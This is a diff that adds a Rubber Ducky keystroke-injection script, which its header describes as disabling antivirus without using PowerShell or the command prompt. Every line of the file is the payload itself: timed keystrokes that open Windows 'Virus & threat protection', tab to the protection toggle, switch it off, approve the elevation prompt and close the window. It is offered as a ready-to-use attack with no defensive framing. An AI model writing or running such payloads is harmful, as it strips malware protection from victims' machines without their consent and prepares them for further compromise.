@@ -1,0 +1,28 @@
+REM --------
+REM https://github.com/TylerPaplham/Rubber-Ducky-Payloads/new/main
+REM Ducky Script for disabling AV w/o using powershell/command prompt
+REM --------
+DELAY 1000
+CONTROL ESCAPE
+DELAY 500
+STRING Virus & threat protection
+DELAY 500
+ENTER
+DELAY 2500
+TAB
+DELAY 500
+TAB 
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 500
+SPACE
+DELAY 800
+ALT y
+DELAY 1500
+ALT SPACE
+DELAY 500
+STRING c
